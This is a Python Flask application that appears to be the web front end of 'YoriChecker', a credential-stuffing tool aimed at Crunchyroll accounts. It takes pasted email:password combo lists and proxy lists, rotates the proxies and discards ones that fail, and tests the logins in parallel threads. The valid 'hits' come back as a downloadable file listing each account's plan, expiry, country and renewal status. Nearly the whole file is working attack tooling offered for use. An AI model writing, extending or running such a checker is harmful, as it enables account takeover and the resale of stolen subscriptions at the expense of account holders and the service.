import os
import io
import threading
from flask import Flask, request, render_template_string, send_file
from concurrent.futures import ThreadPoolExecutor
from checker import CrunchyrollChecker

app = Flask(__name__)

class ProxyManager:
    def __init__(self, proxies):
        self.proxies = [p.strip() for p in proxies if p.strip()]
        self.index = 0
        self.lock = threading.Lock()
        self.last_given = None

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            self.last_given = proxy
            return proxy

    def mark_bad(self, proxy=None):
        with self.lock:
            target = proxy or self.last_given
            if target and target in self.proxies:
                self.proxies.remove(target)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YoriChecker</title>
    <style>
        body { font-family: monospace; background: #121212; color: #e0e0e0; padding: 20px; max-width: 800px; margin: 0 auto; }
        h2 { color: #f39c12; border-bottom: 1px solid #333; padding-bottom: 10px; }
        label { display: block; margin-top: 15px; font-weight: bold; color: #bbb; }
        textarea { width: 100%; height: 150px; background: #1e1e1e; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; margin-top: 5px; }
        button { margin-top: 20px; padding: 12px 24px; background: #f39c12; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; width: 100%; }
        button:disabled { background: #555; cursor: not-allowed; color: #999; }
        button:hover:not(:disabled) { background: #e67e22; }
        #status { margin-top: 20px; padding: 10px; background: #1e1e1e; border-left: 4px solid #f39c12; font-weight: bold; display: none; }
    </style>
</head>
<body>
    <h2>YoriChecker // Crunchyroll</h2>
    <label>Combos (email:password)</label>
    <textarea id="combos" placeholder="user@domain.com:password123"></textarea>
    
    <label>Proxies (ip:port:user:pass or ip:port)</label>
    <textarea id="proxies" placeholder="127.0.0.1:8080"></textarea>
    
    <button id="validateBtn" onclick="validate()">VALIDATE</button>
    <div id="status"></div>

    <script>
        async function validate() {
            const btn = document.getElementById('validateBtn');
            const status = document.getElementById('status');
            btn.disabled = true;
            status.style.display = 'block';
            status.textContent = "Processing... gnawing through the list.";
            status.style.borderLeftColor = '#f39c12';
            
            const combos = document.getElementById('combos').value;
            const proxies = document.getElementById('proxies').value;

            try {
                const response = await fetch('/validate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({combos, proxies})
                });
                
                if (!response.ok) throw new Error("Server error: " + response.statusText);
                
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'YoriChecker.vercel.app.txt';
                document.body.appendChild(a);
                a.click();
                a.remove();
                window.URL.revokeObjectURL(url);
                
                status.textContent = "Done. Hits stashed and downloaded.";
                status.style.borderLeftColor = '#2ecc71';
            } catch (err) {
                status.textContent = "Error: " + err.message;
                status.style.borderLeftColor = '#e74c3c';
            } finally {
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    return "OK", 200

@app.route('/validate', methods=['POST'])
def validate():
    data = request.json
    combos_raw = data.get('combos', '')
    proxies_raw = data.get('proxies', '')

    combos = []
    for line in combos_raw.splitlines():
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                combos.append((parts[0], parts[1]))

    proxies = [p.strip() for p in proxies_raw.splitlines() if p.strip()]
    proxy_mgr = ProxyManager(proxies) if proxies else None
    checker = CrunchyrollChecker(proxy_mgr)

    hits = []

    def check_combo(email, password):
        attempts = 0
        last_result = None
        while attempts < 3:
            result = checker.check_account(email, password)
            last_result = result
            
            if result.get('status') == 'ERROR' and 'proxy' in result.get('error', '').lower():
                if proxy_mgr:
                    proxy_mgr.mark_bad()
                attempts += 1
                continue
            return last_result
        return last_result

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(check_combo, email, pwd) for email, pwd in combos]
        for future in futures:
            res = future.result()
            if res and res.get('status') == 'HIT':
                hits.append(res)

    output = io.StringIO()
    for hit in hits:
        d = hit.get('data', {})
        line = (f"{hit.get('email')}:{hit.get('password')} | "
                f"Plan: {d.get('plan', 'N/A')} | "
                f"Expires: {d.get('expires', 'N/A')} | "
                f"Country: {d.get('country', 'N/A')} | "
                f"Renew: {d.get('renew', 'N/A')}")
        output.write(line + '\n')

    mem = io.BytesIO(output.getvalue().encode('utf-8'))
    return send_file(mem, as_attachment=True, download_name='YoriChecker.vercel.app.txt', mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
